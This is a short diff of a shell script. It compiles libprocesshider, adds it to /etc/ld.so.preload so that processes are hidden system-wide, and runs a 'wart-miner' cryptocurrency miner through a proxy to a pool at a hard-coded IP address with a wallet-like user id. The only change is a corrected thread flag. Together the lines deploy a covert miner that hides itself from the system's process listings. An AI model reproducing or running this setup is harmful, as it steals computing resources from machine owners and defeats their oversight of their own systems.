@@ -72,4 +72,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp  ./wart-miner -h 81.163.20.40 -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33 -30
+./graftcp/graftcp  ./wart-miner -h 81.163.20.40 -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33 -t30
